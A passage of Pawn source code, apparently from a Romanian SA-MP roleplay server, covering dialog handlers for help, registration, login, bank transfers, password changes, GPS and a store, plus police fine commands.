					strcat(gString, "/fdeposit - depozitezi bani, materiale sau droguri.\n");					
				}
				case 8: {
					if(!PlayerInfo[playerid][pMember] || PlayerInfo[playerid][pRank]!=7) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti leader!");
					strcat(gString, "Leader Commands\n\n");
					strcat(gString, "/invite - inviti un player.\n");
					strcat(gString, "/members - vezi membrii factiunii tale si poti sa te ocupi de cei membrii.\n");
					strcat(gString, "/l - chat intre lideri.\n");
					strcat(gString, "/setstatus - setezi statusul aplicatiilor.\n");
					strcat(gString, "/fwithdraw - scoti bani, materiale sau droguri din seif.\n");	
					strcat(gString, "/blockfc - opresti/activezi chatul factiunii.\n");	
					strcat(gString, "/lockhq - inchizi/deschizi HQ-ul\n");		
				}
				case 9: {
					strcat(gString, "Phone Commands\n\n");
					strcat(gString, "/call - apelezi un jucator.\n");
					strcat(gString, "/sms - dai mesaj unui jucator.\n");
					strcat(gString, "/p - raspunzi la apel.\n");
					strcat(gString, "/h - inchizi apelul.\n");
					strcat(gString, "/number - vezi numarul unui jucator.\n");
				}
				case 10: {
					strcat(gString, "Jobs Commands\n\n");
					strcat(gString, "/startwork - pornesti munca.\n");
					strcat(gString, "/stopwork - opresti munca.\n");
					strcat(gString, "/find - cauti un jucator.\n");
					strcat(gString, "/sellmats - vinzi materiale.\n");
					strcat(gString, "/selldrugs - vinzi droguri.\n");
					strcat(gString, "/sellgun - vinzi arme.\n");
					strcat(gString, "/pickup - colectezi gunoiul.\n\n");
					strcat(gString, "/unloadtrash - descarci gunoiul.\n\n");
					strcat(gString, "Owned Job Commands\n\n");
					strcat(gString, "/selljob - vinzi jobul si primesti automat $10,000,000.\n");
					strcat(gString, "/jobbalance - vezi balanta jobului.\n");
					strcat(gString, "/jobwithdraw - scoti banii din job.\n");
				}
				case 11: return ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_MSGBOX, "Clan Commands", "/clan, /(c)lanchat, /cinvite, /clanduty, /spray, /clanzones, /cpark, /ccolor, /cvr, /clanbonus, /cdeposit (pp)", "Close", "");
			}
			ShowPlayerDialog(playerid, DIALOG_BACK, DIALOG_STYLE_MSGBOX, "Help", gString, "Back", "Cancel");
		}	
		case DIALOG_BACK: {
			if(response) return ShowPlayerDialog(playerid, DIALOG_HELP, DIALOG_STYLE_LIST, "Help", "Cont\nGeneral\nChat\nBanca\nAdmin\nVehicule\nCase\nBizz-uri\nFactiune\nLider\nTelefon\nJoburi\nPin", "Ok", "Exit");
		}
		case DIALOG_LOGIN2: {
			if(!response) return Kick(playerid);
			new password[65];
			SHA256_PassHash(inputtext, HASH_ALIAS, password, 65);
			OnPlayerLoginIn(playerid, password);
		}	
		case DIALOG_LOGIN1: {
			if(!response) return true;
			if(!checker(inputtext)) return SendClientMessage(playerid, COLOR_LGREEN, "EROARE: Parola ta trebuie sa contina minim un numar si o litera mare!");
			if(strlen(inputtext)<7) return SendClientMessage(playerid, COLOR_GREY, "Parola trebuie sa contina minim 7 caractere!");
			new str[32] = {'X',...}; str[strlen(inputtext) - 1] = (EOS);
			PlayerTextDrawSetString(playerid, RegisterPTD[playerid][2], str);
			SCMf(playerid, COLOR_YELLOW, "Your password contains %d characters.", strlen(inputtext));
			strmid(RegisterPass[playerid], inputtext, 0, 32);
			RegisrationStep[playerid][3] = true;
		}
		case DIALOG_REGISTER: {
			if(!response) 
				return true;

			RegisrationStep[playerid][0] = true;
			PlayerInfo[playerid][pSex] = listitem+1;
			PlayerTextDrawSetString(playerid, RegisterPTD[playerid][3], listitem ? "Female" : "Male");
			PlayerTextDrawSetPreviewModel(playerid, RegisterPTD[playerid][0], listitem ? 226 : 250);
			PlayerTextDrawShow(playerid, RegisterPTD[playerid][0]);
			SCMf(playerid, COLOR_YELLOW, "Gender set to: %s.", listitem ? "Female" : "Male");
			PlayerInfo[playerid][pModel] = listitem ? 226 : 250;
		}
		case DIALOG_REGISTER2: {
			if(!response) 
				return true;

			if(strval(inputtext) <= 7 || strval(inputtext) >= 50) 
				return ShowPlayerDialog(playerid, DIALOG_REGISTER2,DIALOG_STYLE_INPUT,"SERVER: Age","Set your age here:","Select","Cancel");
			
			PlayerInfo[playerid][pAge] = strval(inputtext);
			SCMf(playerid, COLOR_YELLOW, "Age set to: %d.", strval(inputtext));
			PlayerTextDrawSetString(playerid, RegisterPTD[playerid][6], inputtext);
			RegisrationStep[playerid][1] = true;
		}
		case DIALOG_REGISTER4: {
			if(!response)
				return true;

			if(!IsMail(inputtext)) 
				return ShowPlayerDialog(playerid, DIALOG_REGISTER4, DIALOG_STYLE_INPUT, "SERVER: Email", "Set your email here:", "Select", "Cancel");
		
			strmid(PlayerInfo[playerid][pEmail], inputtext, 0, 32);
			RegisrationStep[playerid][2] = true;
			SCMf(playerid, COLOR_YELLOW, "Email set to: %s", PlayerInfo[playerid][pEmail]);
			PlayerTextDrawSetString(playerid, RegisterPTD[playerid][4], inputtext);
		}
		case DIALOG_REGISTER5: {
			if(!response) 
				return true;

			if(!IsNumeric(inputtext))
				return ShowPlayerDialog(playerid, DIALOG_REGISTER5, DIALOG_STYLE_INPUT, "Referral:", "Ai fost adus de cineva pe comunitate?\nDaca da, scrie ID-ul jucatorului care te-a adus.\n{FFADAD}Referral ID invalid!", "Ok", "No");	
			
			gQuery[0] = EOS;
			mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `id`='%d' LIMIT 1", strval(inputtext));
			mysql_tquery(SQL, gQuery, "SQL_CheckPlayer", "ii", playerid, strval(inputtext));
		}	
		case DIALOG_REGISTER6: {
			if(!response) return PlayerTextDrawSetString(playerid, RegisterPTD[playerid][5], "None"), listitemm[playerid] = 0;
			new i = listitemmm[playerid];
			PlayerTextDrawSetString(playerid, RegisterPTD[playerid][5], RegisterReferral[playerid]);
			SCMf(playerid, COLOR_YELLOW, "Referral set to %s.", RegisterReferral[playerid]);
			PlayerInfo[playerid][pReferral] = listitemm[playerid];
			if(i!=-1) SCMf(i, COLOR_MONEY, "Iti multumim ca l-ai adus pe %s(%d) pe comunitate!", GetName(playerid), playerid);
		}
		case DIALOG_TRANSFER: {
			if(!response) return true;
			if InInterior[playerid] != BUSINESS_INTERIOR *then 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in banca!");

			if(TradeID[playerid] != -1) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi aceasta comanda atata timp cat esti implicat intr-o afacere!");
			new cashbank = TransferMoney[playerid]/100,id=listitemm[playerid];
			if(!ByteVar1@bank[playerid] && ByteVar2@bank[playerid] < eBit:(TransferMoney[playerid]+cashbank)) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai suma necesara pentru a transfera banii!");
			new LastMoney[50];
			format(LastMoney, 50, formatBytes(bank[playerid]));
			GivePlayerBank(playerid, -TransferMoney[playerid]+cashbank);
			GivePlayerBank(id, TransferMoney[playerid]);
			SavePlayerBank(id);
			SavePlayerBank(playerid);
			BizzInfo[InInteriorID[playerid]][bBalance] += cashbank;
			format(string, sizeof(string), "Ai transferat $%s in contul bancar al lui %s. Taxa: $%s", FormatNumber(TransferMoney[playerid]), GetName(id),FormatNumber(cashbank));
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			SendClientMessage(playerid, COLOR_MONEY, string);
			format(string, sizeof(string), "Ai primit $%s in contul tau bancar de la %s.", FormatNumber(TransferMoney[playerid]), GetName(playerid), playerid);
			SendClientMessage(id, COLOR_MONEY, string);
			if(PlayerInfo[id][pShowBanca] == 1) {
				format(string, sizeof(string), "$%s", formatBytes(bank[id]));
				PlayerTextDrawSetString(id, BancaTD, string);
			}
			if(PlayerInfo[playerid][pShowBanca] == 1) {
				format(string, sizeof(string), "$%s", formatBytes(bank[playerid]));
				PlayerTextDrawSetString(playerid, BancaTD, string);
			}
			format(string, sizeof(string), "($) %s a transferat $%s lui %s, [last bank money: $%s]", GetName(playerid), FormatNumber(TransferMoney[playerid]), GetName(id), LastMoney);
			SendAdminMessage(COLOR_YELLOW, string, 1);
			
			PlayerPlaySound(id, 1052, 0.0, 0.0, 0.0);
			Transferlog(GetName(playerid), GetName(id),PlayerInfo[id][pSQLID],PlayerInfo[playerid][pSQLID],TransferMoney[playerid]);
			TransferMoney[playerid] = 0;
		}
		case DIALOG_NEWPASS: {
			if(!response) return true;
			SHA256_PassHash(inputtext, HASH_ALIAS, inputtext, 65);
			if !compare(inputtext, PlayerInfo[playerid][pKey]) *then return SendClientMessage(playerid, COLOR_WARNING, "Parola invalida!");
			ShowPlayerDialog(playerid, DIALOG_NEWPASS1,DIALOG_STYLE_INPUT, "Change password","Scrie mai jos noua parola pe care vrei s-o ai.","Ok","Close");
		}
		case DIALOG_NEWPASS1: {
			if(!response) return true;
			if(strlen(inputtext) < 7 || strlen(inputtext) > 30) return ShowPlayerDialog(playerid, DIALOG_NEWPASS1,DIALOG_STYLE_INPUT, "Change password","Scrie mai jos noua parola pe care vrei s-o ai.","Ok","Close");
			SHA256_PassHash(inputtext, HASH_ALIAS, PlayerInfo[playerid][pKey], 65);
			_query("UPDATE `users` SET `password`='%s' WHERE `id`='%d'", PlayerInfo[playerid][pKey], PlayerInfo[playerid][pSQLID]);
			DeelayCommand[playerid][31]=gettime()+60;
			format(gString, 128, "Noua ta parola este %s.", inputtext);
			ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "New password", gString, "Ok", "");
			SendClientMessage(playerid, COLOR_YELLOW, "Ti-ai schimbat parola!");
			format(gString, 128, "* %s[user:%d] changed his password.", PlayerInfo[playerid][pUsername], PlayerInfo[playerid][pSQLID]);
			SendAdminMessage(COLOR_YELLOW, gString, 1);
		}
		case DIALOG_LOCATIONS: {
			if(!response) return true;
			if(CP[playerid] != 0) return ShowPlayerDialog(playerid, DIALOG_CHECKPOINT, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Do you want to cancel your current checkpoint?", "Yes", "No");
			switch(listitem) {
				case 0: {
					for(new i = 0; i < 19; i++) {
						format(gQuery, 128, "[#%d]. %s (%d)\n", i+1, BizzName[i], GpsBizzType[i]);
						strcat(gString, gQuery);
					}
					ShowPlayerDialog(playerid, DIALOG_LOCATIONS3, DIALOG_STYLE_LIST, "Businesses", gString, "Select", "Back");			
					return true;
				}
				case 1: {
					format(gString, 500, "Location\tDistance\n\
					Dealership\t{D7FFB3}%0.2fm\n\
					Scoala de soferi (DMV)\t{D7FFB3}%0.2fm\n\
					Arena de evente\t{D7FFB3}%0.2fm\n\
					Paintball\t{D7FFB3}%0.2fm\n\
					Race Arena\t{D7FFB3}%0.2fm\n\
					Crate Place\t{D7FFB3}%0.2fm\n\
					Tuning SF\t{D7FFB3}%0.2fm\n\
					Tuning LV\t{D7FFB3}%0.2fm\n\
					Tuning LS\t{D7FFB3}%0.2fm\n\
					Jail\t{D7FFB3}%0.2fm", 
					GetPlayerDistanceFromPoint(playerid, 2131.7717,-1151.3202,24.0600), 
					GetPlayerDistanceFromPoint(playerid, 2183.1238,2295.2339,10.8203), 
					GetPlayerDistanceFromPoint(playerid, 1671.9106,-1328.7018,17.4483), 
					GetPlayerDistanceFromPoint(playerid, BizzInfo[BizzTypeID[14][0]][bEntranceX], BizzInfo[BizzTypeID[14][0]][bEntranceY], BizzInfo[BizzTypeID[14][0]][bEntranceZ]), 
					GetPlayerDistanceFromPoint(playerid, BizzInfo[BizzTypeID[16][0]][bEntranceX], BizzInfo[BizzTypeID[16][0]][bEntranceY], BizzInfo[BizzTypeID[16][0]][bEntranceZ]), 
					GetPlayerDistanceFromPoint(playerid, -2414.0938,-602.3504,132.5625), 
					GetPlayerDistanceFromPoint(playerid, -1935.7448,239.1340,34.3218),
					GetPlayerDistanceFromPoint(playerid, 2387.2058,1039.3319,10.8203),
					GetPlayerDistanceFromPoint(playerid, 2644.7202,-2035.2052,13.5540),
					GetPlayerDistanceFromPoint(playerid, 1324.8218,287.2477,20.0452));
					ShowPlayerDialog(playerid, DIALOG_LOCATIONS2, DIALOG_STYLE_TABLIST_HEADERS, "Important Locations", gString, "Select", "Exit");			
					return true;
				}
				case 2: SetPlayerCheckpoint(playerid, 1592.5995,-2181.1919,13.5547, 2.0);
				case 3: SetPlayerCheckpoint(playerid, -202.1672,1751.2111,99.4576, 2.0);
				case 4: SetPlayerCheckpoint(playerid, -2111.5608,-444.2706,38.7344, 2.0);
			}	
			CP[playerid] = 43;
			SendClientMessage(playerid, COLOR_YELLOW, "Server-ul ti-a marcat un checkpoint pe harta catre locatia selectata.");
		}
		case DIALOG_LOCATIONS2: {
			if(!response) return true;
			if(CP[playerid] != 0) return ShowPlayerDialog(playerid, DIALOG_CHECKPOINT, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Do you want to cancel your current checkpoint?", "Yes", "No");
			switch(listitem) {
				case 0: SetPlayerCheckpoint(playerid, 2131.7717,-1151.3202,24.0600, 2.0);//dealership
				case 1: SetPlayerCheckpoint(playerid, 2183.1238,2295.2339,10.8203, 2.0); // DMV
				case 2: SetPlayerCheckpoint(playerid, 1671.9106,-1328.7018,17.4483, 2.0); // Arena de evente
				case 3: SetPlayerCheckpoint(playerid, BizzInfo[BizzTypeID[14][0]][bEntranceX], BizzInfo[BizzTypeID[14][0]][bEntranceY], BizzInfo[BizzTypeID[14][0]][bEntranceZ], 2.0); // Paintball
				case 4: SetPlayerCheckpoint(playerid, BizzInfo[BizzTypeID[16][0]][bEntranceX], BizzInfo[BizzTypeID[16][0]][bEntranceY], BizzInfo[BizzTypeID[16][0]][bEntranceZ], 2.0); // race arena
				case 5: SetPlayerCheckpoint(playerid, -2414.0938,-602.3504,132.5625, 10.0); // crates place
				case 6: SetPlayerCheckpoint(playerid, 1953.8718,-2198.6995,13.5469, 2.0); // Rent Fly
				case 7: SetPlayerCheckpoint(playerid, -1935.7448,239.1340,34.3218, 10.0); // tuning sf
			}
			CP[playerid] = 43;
			SendClientMessage(playerid, COLOR_YELLOW, "Ti-a fost pus un checkpoint catre locatia importanta aleasa de tine!");
		}
		case DIALOG_LOCATIONS3: {
			if(!response) return ShowPlayerDialog(playerid, DIALOG_LOCATIONS, DIALOG_STYLE_LIST, "GPS", "Businesses\nImportant Locations\nTuning & Neon Place\nShop Quest\nBattlepass Reward", "Select", "Exit");
			if(CP[playerid] != 0) return ShowPlayerDialog(playerid, DIALOG_CHECKPOINT, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Do you want to cancel your current checkpoint?", "Yes", "No");
			for(new i = 0; i < GpsBizzType[listitem]; i++) {
				new idd = BizzTypeID[listitem][i];
				format(gQuery, 128, "%s (%d) - %0.2fm\n", BizzName[listitem], i+1, GetPlayerDistanceFromPoint(playerid, BizzInfo[idd][bEntranceX], BizzInfo[idd][bEntranceY], BizzInfo[idd][bEntranceZ]));
				strcat(gString, gQuery);
			}
			ShowPlayerDialog(playerid, DIALOG_LOCATIONS5, DIALOG_STYLE_LIST, "Businesses", gString, "Select", "Exit");		
			listitemm[playerid] = listitem;
		}
		case DIALOG_LOCATIONS5: {
			if(!response) return true;
			if(CP[playerid] != 0) return ShowPlayerDialog(playerid, DIALOG_CHECKPOINT, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Do you want to cancel your current checkpoint?", "Yes", "No");
			new idd = BizzTypeID[listitemm[playerid]][listitem];
			SetPlayerCheckpoint(playerid, BizzInfo[idd][bEntranceX], BizzInfo[idd][bEntranceY], BizzInfo[idd][bEntranceZ], 2.0);		
			CP[playerid] = 43;
			SCMf(playerid, COLOR_YELLOW, "Checkpoint setat catre biz-ul %s (ID: %d).", BizzName[listitemm[playerid]], BizzInfo[idd][bID]);
		}
		case DIALOG_STORE: {
			if(!response) return true;
			if InInterior[playerid] != BUSINESS_INTERIOR *then
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti intr-un business!");

			switch(listitem) {
				case 0: { 
					if(GetPlayerCash(playerid) < 100000) return SendClientMessage(playerid, COLOR_GREY, "Nu ai destui bani pentru a face asta.");				
					if(strlen(PlayerInfo[playerid][pPhone]) == 4) return SendClientMessage(playerid, COLOR_GREY, "Nu poti cumpara un alt numar de telefon deoarece ai iPhone!");
					GivePlayerCash(playerid, -100000);
					BizzInfo[InInteriorID[playerid]][bBalance] += 100000;			    
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					new num[6];
					if HavePhone(playerid) *then DeleteSVar(PlayerInfo[playerid][pPhone]);
					for(;;) {
						format(num,6,"%d", RandomEx(10000, 99999));
						if((GetGVarInt(num)-1)!=-1) continue;
						SetGVarInt(num, playerid+1);
						break;
					}
					strmid(PlayerInfo[playerid][pPhone], num,0,6);
					UpdateVarStr(playerid, "PhoneNr", PlayerInfo[playerid][pPhone]);
					format(string, sizeof(string), "Ti-ai cumparat un telefon iar numarul tau este %s.", num);
					SendClientMessage(playerid, COLOR_WHITE, string);
					RegisrationStep[playerid][0] = false;
				}
				case 1: {
					if(PlayerInfo[playerid][pPhoneBook]==1) return SendClientMessage(playerid, -1, "Ai deja o agenda de telefon!");
					if(GetPlayerCash(playerid) < 75000) return SendClientMessage(playerid, COLOR_GREY, "Nu ai destui bani pentru a face asta.");
					GivePlayerCash(playerid, -75000);
					BizzInfo[InInteriorID[playerid]][bBalance] += 75000;
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					PlayerInfo[playerid][pPhoneBook] = 1;
					SendClientMessage(playerid, COLOR_WHITE, "Ti-ai cumparat o agenda telefonica. Foloseste comanda /number pentru a vedea numarul unui player.");
					UpdateVar(playerid, "Phonebook", true);
					RegisrationStep[playerid][1] = false;
				}
				case 2: {
					ShowPlayerDialog(playerid, DIALOG_PHONECREDITS, DIALOG_STYLE_INPUT, "24/7: Buy Credit", "Introdu suma de credite pe care vrei sa o achizitonezi:", "Buy", "Cancel");
				}
				case 3: {
					if(GetPlayerCash(playerid) < 150000) return SendClientMessage(playerid, COLOR_GREY, "Nu ai destui bani pentru a face asta.");
					if(PlayerInfo[playerid][pWTalkie]==1) return SendClientMessage(playerid, -1, "Ai deja o frecventa radio!");
					GivePlayerCash(playerid, -150000);
					BizzInfo[InInteriorID[playerid]][bBalance] += 150000;		    
					PlayerInfo[playerid][pWTalkie] = 1;
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					SendClientMessage(playerid, COLOR_WHITE, "Ti-ai cumparat o frecventa radio. Foloseste /setfreq pentru a seta frecventa.");
					UpdateVar(playerid, "WTalkie", true);
				}
				case 4: {
					if(GetPlayerCash(playerid) < 50000) return SendClientMessage(playerid, COLOR_GREY, "Nu ai destui bani pentru a face asta.");
					if(PlayerInfo[playerid][pLighter] != 0) return SendClientMessage(playerid, COLOR_WHITE, "Ai deja o bricheta.");
					GivePlayerCash(playerid, -50000);
					BizzInfo[InInteriorID[playerid]][bBalance] += 50000;		    
					PlayerInfo[playerid][pLighter] = 10;
					SendClientMessage(playerid, -1, "Ti-ai cumparat o bricheta.");
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
				}
				case 5: {
					if(GetPlayerCash(playerid) < 10000) return SendClientMessage(playerid, COLOR_GREY, "Nu ai destui bani pentru a face asta.");
					if(PlayerInfo[playerid][pCigarettes] > 0) return SendClientMessage(playerid, -1, "Ai deja tigari.");
					PlayerInfo[playerid][pCigarettes] = 10;
					GivePlayerCash(playerid, -10000);
					BizzInfo[InInteriorID[playerid]][bBalance] += 10000;		 
					SendClientMessage(playerid, -1, "Ti-ai cumparat tigari. Ca sa fumezi, foloseste comanda /smoke.");
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					UpdateVar(playerid, "Cigarettes", true);
				}
				case 6: {
					if(GetPlayerCash(playerid) < 200000) return SendClientMessage(playerid, COLOR_GREY, "Nu ai destui bani pentru a face asta.");
					if(PlayerInfo[playerid][pGasCan] != 0) return SendClientMessage(playerid, COLOR_WHITE, "Ai deja canistra.");
					GivePlayerCash(playerid, -200000);
					BizzInfo[InInteriorID[playerid]][bBalance] += 200000;			    
					PlayerInfo[playerid][pGasCan] = 1;
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					SendClientMessage(playerid, COLOR_WHITE, "Ti-ai cumparat o canistra. Pentru a pune benzina in canistra, foloseste /fillgascan.");
					UpdateVar(playerid, "GasCan", true);
				}
				case 7: {
					if(GetPlayerCash(playerid) < 3000) return SendClientMessage(playerid, COLOR_GREY, "Nu ai destui bani pentru a face asta.");
					GivePlayerCash(playerid, -3000);
					BizzInfo[InInteriorID[playerid]][bBalance] += 3000;			    
					ServerWeapon(playerid, 43, 50);
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					SendClientMessage(playerid, COLOR_WHITE, "Ti-ai cumparat o camera foto pentru $3,000.");
				}
				case 8: {
					if(GetPlayerCash(playerid) < 6000) return SendClientMessage(playerid, COLOR_GREY, "Nu ai destui bani pentru a face asta.");
					GivePlayerCash(playerid, -6000);
					BizzInfo[InInteriorID[playerid]][bBalance] += 6000;			    
					ServerWeapon(playerid, 41, 500);
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					SendClientMessage(playerid, COLOR_WHITE, "Ti-ai cumparat o Spraycan pentru $6,000.");
				}
			}
			if(PlayerInfo[playerid][pTutorial] == 2 && HavePhone(playerid) && PlayerInfo[playerid][pPhoneBook] && PlayerInfo[playerid][pCredit]) {
				for(new i=0;i<20;i++) SendClientMessage(playerid, COLOR_LIGHTGOLD, "");
				SendClientMessage(playerid, COLOR_LIGHTGOLD, " -- Tutorial Step 3/5 -- ");
				SendClientMessage(playerid, COLOR_LIGHTGOLD, "Ti-ai cumparat toate lucrurile necesare pentru contul tau.");
				SendClientMessage(playerid, COLOR_LIGHTGOLD, "Urmatorul pas pe care trebuie sa-l faci este de a-ti schimba skinul.");
				SendClientMessage(playerid, COLOR_LIGHTGOLD, "Pentru a localiza un biz de tip Binco, foloseste comanda (/gps).");
				SendClientMessage(playerid, COLOR_LIGHTGOLD, " -- ");
				GameTextForPlayer(playerid, "Step: 3/5", 5000, 1);
				PlayerInfo[playerid][pTutorial]++;
				UpdateVar(playerid, "Tutorial", PlayerInfo[playerid][pTutorial]);
				SetPlayerCheckpoint(playerid, 2101.8936,2257.4214,11.0234, 2.0);
				CP[playerid] = 53;
			}
		}			
	}
	return true;
}

cmd:faruri(playerid, params[]) {
	if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu faci parte dintr-un departament de politie!");

	if(!OnDuty[playerid]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti la datorie!");

	new id;
	if(sscanf(params, "u", id)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/permis <playerid/name>");

	if(!IsPlayerInRangeOfPlayer(playerid, id, 20.0)) return SendClientMessage(playerid, COLOR_GREY, "Acel player nu este in apropiera ta!");

	if(playerid == id) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi aceasta comanda asupra ta!");


	sendSplittedMessageToPlayer(id, COLOR_WHITE, COLOR_WHITE, "> %s: {4F90FF}%s{FFFF00}! Ai fost surprins conducand cu farurile stinse. Te rog sa folosesti '/handsup' pentru acordarea unei amenzi.", GetName(playerid), GetName(id));
	sendSplittedMessageToPlayer(playerid, COLOR_WHITE, COLOR_WHITE, "> %s: {4F90FF}%s{FFFF00}! Ai fost surprins conducand cu farurile stinse. Te rog sa folosesti '/handsup' pentru acordarea unei amenzi.", GetName(playerid), GetName(id));
	va_SendClientMessage(id, COLOR_YELLOW, "> %s: Refuzul acestui ordin va duce la sanctionarea dumneavoastra cu wanted 2 'Neconformare ordin'.", GetName(playerid));
	va_SendClientMessage(playerid, COLOR_YELLOW, "> %s: Refuzul acestui ordin va duce la sanctionarea dumneavoastra cu wanted 2 'Neconformare ordin'.", GetName(playerid));
	return true;
} 

cmd:nos2(playerid, params[]) {
	if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu faci parte dintr-un departament de politie!");

	if(!OnDuty[playerid]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti la datorie!");

	new id;
	if(sscanf(params, "u", id)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/nos <playerid/name>");

	if(!IsPlayerInRangeOfPlayer(playerid, id, 20.0)) return SendClientMessage(playerid, COLOR_GREY, "Acel player nu este in apropiera ta!");

	if(playerid == id) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi aceasta comanda asupra ta!");

	sendSplittedMessageToPlayer(id, COLOR_YELLOW, COLOR_YELLOW, "> %s: {4F90FF}%s{FFFF00}! Ai fost surprins conducand cu NOS. Te rog sa folosesti '/handsup' pentru acordarea unei amenzi.", GetName(playerid), GetName(id));
	sendSplittedMessageToPlayer(playerid, COLOR_YELLOW, COLOR_YELLOW, "> %s: {4F90FF}%s{FFFF00}! Ai fost surprins conducand cu NOS. Te rog sa folosesti '/handsup' pentru acordarea unei amenzi.", GetName(playerid), GetName(id));
	va_SendClientMessage(id, COLOR_YELLOW, "> %s: Refuzul acestui ordin va duce la sanctionarea dumneavoastra cu wanted 2 'Neconformare ordin'.", GetName(playerid));
	va_SendClientMessage(playerid, COLOR_YELLOW, "> %s: Refuzul acestui ordin va duce la sanctionarea dumneavoastra cu wanted 2 'Neconformare ordin'.", GetName(playerid));
	return true;
} 
cmd:permis(playerid, params[]) {
	if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu faci parte dintr-un departament de politie!");

	if(!OnDuty[playerid]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti la datorie!");

	new id;
	if(sscanf(params, "u", id)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/permis <playerid/name>");

	if(!IsPlayerInRangeOfPlayer(playerid, id, 20.0)) return SendClientMessage(playerid, COLOR_GREY, "Acel player nu este in apropiera ta!");

	if(playerid == id) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi aceasta comanda asupra ta!");

	sendSplittedMessageToPlayer(id, COLOR_YELLOW, COLOR_YELLOW, "> %s: {4F90FF}%s{FFFF00}! Ai fost surprins conducand neregulamentar. Te rog sa folosesti '/handsup' pentru confiscarea permisului de conducere.", GetName(playerid), GetName(id));
	sendSplittedMessageToPlayer(playerid, COLOR_YELLOW, COLOR_YELLOW, "> %s: {4F90FF}%s{FFFF00}! Ai fost surprins conducand neregulamentar. Te rog sa folosesti '/handsup' pentru confiscarea permisului de conducere.", GetName(playerid), GetName(id));
	va_SendClientMessage(id, COLOR_YELLOW, "> %s: Refuzul acestui ordin va duce la sanctionarea dumneavoastra cu wanted 2 'Neconformare ordin'.", GetName(playerid));
	va_SendClientMessage(playerid, COLOR_YELLOW, "> %s: Refuzul acestui ordin va duce la sanctionarea dumneavoastra cu wanted 2 'Neconformare ordin'.", GetName(playerid));
	return true;
} 
cmd:casca(playerid, params[]) {
	if(!IsACop(playerid))
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu faci parte dintr-un departament de politie!");

	if(!OnDuty[playerid])
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti la datorie!");

	new id;
	if(sscanf(params, "u", id))
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/casca <playerid/name>");

	if(!IsPlayerInRangeOfPlayer(playerid, id, 20.0))
		return SendClientMessage(playerid, COLOR_GREY, "Acel player nu este in apropiera ta!");

	if(playerid == id)
		return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi aceasta comanda asupra ta!");


	sendSplittedMessageToPlayer(id, COLOR_YELLOW, COLOR_YELLOW, "> %s: {4F90FF}%s{FFFF00}! Ai fost surprins conducand fara casca de protectie. Te rog sa folosesti '/handsup' pentru acordarea unei amenzi.", GetName(playerid), GetName(id));
	sendSplittedMessageToPlayer(playerid, COLOR_YELLOW, COLOR_YELLOW, "> %s: {4F90FF}%s{FFFF00}! Ai fost surprins conducand fara casca de protectie. Te rog sa folosesti '/handsup' pentru acordarea unei amenzi.", GetName(playerid), GetName(id));
	va_SendClientMessage(id, COLOR_YELLOW, "> %s: Refuzul acestui ordin va duce la sanctionarea dumneavoastra cu wanted 2 'Neconformare ordin'.", GetName(playerid));
	va_SendClientMessage(playerid, COLOR_YELLOW, "> %s: Refuzul acestui ordin va duce la sanctionarea dumneavoastra cu wanted 2 'Neconformare ordin'.", GetName(playerid));
	return true;
} 

cmd:skillupgrade(playerid, params[]) {
	format(gString, 256, "#.\tJob Name\tStatus\tPrice\n1.\tFarmer\t%s\t6969 BPoints\n2.\tTrucker\t%s\t6969 BPoints\n3.\tFisher (all jobs)\t%s\t6969 BPoints\n4.\tPizza Boy\t%s\t6969 BPoints\n5.\tLumberjack\t%s\t6969 BPoints", PlayerInfo[playerid][pJobSkill][1]!=7?("{FF5C5C}Locked"):("{98FF5C}Unlocked"), PlayerInfo[playerid][pJobSkill][2]!=7?("{FF5C5C}Locked"):("{98FF5C}Unlocked"), PlayerInfo[playerid][pJobSkill][11]!=7?("{FF5C5C}Locked"):("{98FF5C}Unlocked"), PlayerInfo[playerid][pJobSkill][9]!=7?("{FF5C5C}Locked"):("{98FF5C}Unlocked"), PlayerInfo[playerid][pJobSkill][3]!=7?("{FF5C5C}Locked"):("{98FF5C}Unlocked"));
	ShowPlayerDialog(playerid, DIALOG_SKILLUPGRADE, DIALOG_STYLE_TABLIST_HEADERS, "{F4AD42}Skill {FFFFFF}Upgrade", gString, "Select", "Cancel");
	return true;
}

cmd:jailmenu(playerid, params[]) {
	if(PlayerInfo[playerid][pJailTime] < 1) return true;
